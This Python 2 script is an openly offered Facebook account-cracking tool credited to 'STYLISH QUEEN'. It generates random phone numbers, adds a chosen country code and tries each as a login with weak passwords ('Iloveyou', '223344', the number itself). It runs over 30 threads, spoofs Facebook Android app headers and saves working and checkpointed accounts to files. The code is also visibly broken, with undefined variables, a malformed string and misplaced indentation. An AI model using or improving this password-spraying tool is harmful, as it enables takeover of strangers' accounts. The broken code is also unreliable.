#!/usr/bin/python2
# coding=utf-8


import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(10000):
    nmbr = random.randint(1111111111, 9999999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('No Module Named Requests! type:pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('No Module Named Mechanize! type:pip2 install mechanize')
    time.sleep(1)
    os.system('Then type: python2 jam.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)
header = {
    'x-fb-connection-bandwidth': repr(bd),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }
def keluar():
    print 'Thanks.'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')

##### LOGO #####


logo = """
\033[91m  ����������  \033[96m����������  \033[93m���������  \033[92m �
\033[91m  ���    ���  \033[96m���    ���  \033[93m���   ���  \033[92m��� 
\033[91m  ���         \033[96m���    ���  \033[93m���   ���  \033[92m��� 
\033[91m  ����������  \033[96m����������  \033[93m���   ���  \033[92m��� 
\033[91m         ���  \033[96m���    ���  \033[93m���   ���  \033[92m���  
\033[91m  ���    ���  \033[96m���    ���  \033[93m���   ���  \033[92m���  
\033[91m  ����������  \033[96m���    ���  \033[93m���   ���  \033[92m��� \x1b[90mQUEEN
\033[94m----------------------------------------------
\033[1;90m? Author : \033[1;97mSTYLISH QUEEN
\033[1;90m? Github : \033[1;97mhttps://github.com/stylish-queen
\033[1;90m? Fb Page: \033[1;97mJam Shahrukh Official
\033[1;94m---------------------------------------------- 
"""


back = 0
successful = []
cpb = []
oks = []
id = []
def menu():
	os.system('clear')
	print logo
	print "\033[1;92mWELCOME TO ALL "
	print "\033[1;92m[1]  India"
	print "\033[1;92m[2]  Uk"
	print "\033[1;92m[3]  Usa"
	print "\033[1;92m[4]  BACK TO MAIN MENU"
	
	
	    
	print 50*'-'
	action()
	
def action():	
	bch = raw_input('\n  ENTER HERE COUNTRY CODE ')
	if bch =='':
		print '[!] Fill in correctly'
		action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		print "\033[1;91mINDIA COUNTRY CODE HERE"		
		print "\033[1;95mfor example , 91 ,"
		try:
			c = raw_input(" SELECTED CODE: ")
			k="+"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="2":			
		
		print (logo)
		print "\033[1;91mUK COUNTRY CODE HERE"		
		print "\033[1;95mfor example,44,""
		try:
			c = raw_input(" SELECTED CODE: ")
			k="+"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="3":			
		os.system("clear")
		print (logo)
		print "\033[1;91mCOUNTRY CODE HERE"	
		print "\033[1;95mfor example, 1 ,"
		try:
		    c = raw_input(" SELECTED CODE: ")
		    k="+"
		    idlist = ('.txt')
		    for line in open(idlist,"r").readlines():
		        id.append(line.strip())
				
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	else:
		print '[!] Fill in correctly'
		action()
 
	xxx = str(len(id))
	psb ("\033[1;92m TOTAL NUMBER: " + xxx)
	time.sleep(0.5)
	psb ("\033[1;92m CRACK RUNNING...")
	time.sleep(0.5)
	psb ("\033[1;92m[!](To Exit) Press CTRL Then Press z")
	time.sleep(0.5)
	print 50*'-'
	
			
	def main(arg):
		global cpb,oks
		user = arg
		
	try:
		    pass1 = user
		    data = requests.get('http://localhost:5000/auth?id=' + k + c + user + '&pass=' + pass1, headers = header).text
		    q = json.load(data)
		    if 'loc' in q:
		        print '\x1b[1;92m|Jam|\x1b[1;92mOk|  ' + k + c + user + ' | ' + pass1
		        okb = open('save/successfull.txt', 'a')
		        okb.write(k+c+user+'|'+pass1+'\n')
		        okb.close()
		        oks.append(c+user+pass1)
		    elif 'www.facebook.com' in q['error_msg']:
		        print '\x1b[1;94m|Jam|\x1b[1;94mCp|  ' + k + c + user + ' | ' + pass1
		        cps = open('save/checkpoint.txt', 'a')
		        cps.write(k+c+user+'|'+pass1+'\n')
		        cps.close()
		        cpb.append(c+user+pass1)
		    else:
		        pass2 = 'Iloveyou'
		        data = requests.get('http://localhost:5000/auth?id=' + k + c + user + '&pass=' + pass2, headers = header).text
		        q = json.load(data)
		        if 'loc' in q:
		            print '\x1b[1;92m|Jam|\x1b[1;92mOk|  ' + k + c + user + ' | ' + pass2
		            okb = open('save/successfull.txt', 'a')
		            okb.write(k+c+user+'|'+pass2+'\n')
		            okb.close()
		            oks.append(c+user+pass2)
		        elif 'www.facebook.com' in q['error_msg']:
		            print '\x1b[1;94m|Jam|\x1b[1;94mCp|  ' + k + c + user + ' | ' + pass2
		            cps = open('save/checkpoint.txt', 'a')
		            cps.write(k+c+user+'|'+pass2+'\n')
		            cps.close()
		            cpb.append(c+user+pass2)
		        else:
		            pass3 = '223344'
		            data = requests.get('http://localhost:5000/auth?id=' + k + c + user + '&pass=' + pass3, headers = header).text
		            q = json.load(data)
		            if 'loc' in q:
		                print '\x1b[1;92m|Jam|\x1b[1;92mOk|  ' + k + c + user + ' | ' + pass3
		                okb = open('save/successfull.txt', 'a')
		                okb.write(k+c+user+'|'+pass3+'\n')
		                okb.close()
		                oks.append(c+user+pass3)
	                    elif 'www.facebook.com' in q['error_msg']:
		                print '\x1b[1;94m|Jam|\x1b[1;94mCp|  ' + k + c + user + ' | ' + pass3
		                cps = open('save/checkpoint.txt', 'a')
		                cps.write(k+c+user+'|'+pass3+'\n')
		                cps.close()
		                cpb.append(c+user+pass3)
		except:																		
			pass
		
	p = ThreadPool(30)
        p.map(main, id)
        print '\x1b[1;97m--------------------------------------------------'
        print '[\xe2\x9c\x93]crack end ...'
        print '[\xe2\x9c\x93] Total hack : ' + str(len(oks)) + '/' + str(len(cpb))
        print '[\xe2\x9c\x93] Cloned Accounts Has Been Saved : anggaxd/clone.txt'
        raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;95m]')
        menu()


if __name__ == '__main__':
    menu()
